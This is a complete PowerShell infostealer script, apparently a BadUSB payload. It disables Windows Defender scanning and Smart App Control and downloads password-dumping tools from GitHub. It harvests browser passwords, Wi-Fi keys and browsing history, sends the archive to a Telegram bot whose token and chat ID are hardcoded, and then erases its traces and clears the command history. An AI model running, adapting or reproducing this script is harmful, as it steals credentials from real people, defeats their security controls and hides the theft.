[CmdletBinding()]
param(
    [string]$Token,
    [string]$ChatID,
    [int]$HistoryDays = 7
)

if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
if (-not $ChatID) { $ChatID = '1859879540' }

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 1 }

$pub = $env:PUBLIC
if (-not $pub) { $pub = 'C:\Users\Public' }

$basePath   = Join-Path $pub 'scripts'
$dumpFolder = Join-Path $basePath ('{0}-{1}' -f $env:USERNAME, (Get-Date -Format yyyy-MM-dd))
$dumpFile   = $dumpFolder + '.zip'

New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Set-Location $basePath

Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue

$ciKey   = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
$prevSac = (Get-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value 0 -ErrorAction SilentlyContinue
& CiTool --refresh --json | Out-Null

$tools = [ordered]@{
  'WirelessKeyView.exe'     = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WirelessKeyView.exe'
  'WebBrowserPassView.exe'  = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WebBrowserPassView.exe'
  'BrowsingHistoryView.exe' = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/BrowsingHistoryView.exe'
  'WNetWatcher.exe'         = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WNetWatcher.exe'
}
foreach ($t in $tools.Keys) {
  $dst = Join-Path $basePath $t
  for ($i = 0; $i -lt 3; $i++) {
    try { Invoke-WebRequest $tools[$t] -OutFile $dst -UseBasicParsing -TimeoutSec 60; break } catch { Start-Sleep 2 }
  }
}

$jobs = @(
  @{ exe='WNetWatcher.exe';         args=@('/stext','connected_devices.txt'); wait=10 },
  @{ exe='BrowsingHistoryView.exe'; args=@('/HistorySource','1','/VisitTimeFilterType','2','/VisitTimeFilterNumberOfDays',"$HistoryDays",'/stext','history.txt'); wait=30 },
  @{ exe='WebBrowserPassView.exe';  args=@('/stext','passwords.txt'); wait=25 },
  @{ exe='WirelessKeyView.exe';     args=@('/stext','wifi.txt'); wait=20 }
)

foreach ($j in $jobs) {
  $exe = Join-Path $basePath $j.exe
  if (-not (Test-Path $exe)) { continue }
  $out = Join-Path $basePath $j.args[-1]
  try { Start-Process -FilePath $exe -ArgumentList $j.args -WorkingDirectory $basePath -WindowStyle Hidden } catch {}
  $n = 0
  while ($n -lt $j.wait -and -not (Test-Path $out)) { Start-Sleep 1; $n++ }
  Start-Sleep 2
  Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($j.exe)) -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

$files = 'passwords.txt','wifi.txt','connected_devices.txt','history.txt' |
         ForEach-Object { Join-Path $basePath $_ } | Where-Object { Test-Path $_ -PathType Leaf }
if (-not $files) { exit 1 }

Move-Item $files -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
Compress-Archive -Path (Join-Path $dumpFolder '*') -DestinationPath $dumpFile -Force -ErrorAction SilentlyContinue
if (-not (Test-Path $dumpFile)) { exit 1 }

if (-not ('System.Net.Http.HttpClient' -as [type])) {
  $p = Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64\' -Recurse -Filter 'System.Net.Http.dll' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
  if ($p) { Add-Type -Path $p } else { exit 1 }
}

$uri  = "https://api.telegram.org/bot$Token/sendDocument"
$sent = $false

for ($i = 0; $i -lt 3 -and -not $sent; $i++) {
  $fs = $null; $client = $null; $content = $null
  try {
    $client  = New-Object System.Net.Http.HttpClient
    $client.Timeout = [TimeSpan]::FromMinutes(5)
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $content.Add((New-Object System.Net.Http.StringContent($ChatID)), 'chat_id')
    $content.Add((New-Object System.Net.Http.StringContent("$env:COMPUTERNAME / $env:USERNAME")), 'caption')
    $fs = [IO.File]::OpenRead($dumpFile)
    $sc = New-Object System.Net.Http.StreamContent($fs)
    $sc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')
    $content.Add($sc, 'document', [IO.Path]::GetFileName($dumpFile))
    $resp = $client.PostAsync($uri, $content).GetAwaiter().GetResult()
    if ($resp.IsSuccessStatusCode) { $sent = $true }
  } catch { Start-Sleep 5 }
  finally {
    if ($fs) { $fs.Close(); $fs.Dispose() }
    if ($content) { $content.Dispose() }
    if ($client) { $client.Dispose() }
  }
}

Set-Location $pub
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-Item (Join-Path $pub 'p.ps1') -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue
if ($null -ne $prevSac) { Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value $prevSac -ErrorAction SilentlyContinue }
& CiTool --refresh --json | Out-Null

$ws = New-Object -ComObject WScript.Shell
1..4 | ForEach-Object { $ws.SendKeys('{CAPSLOCK}'); Start-Sleep 1 }
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
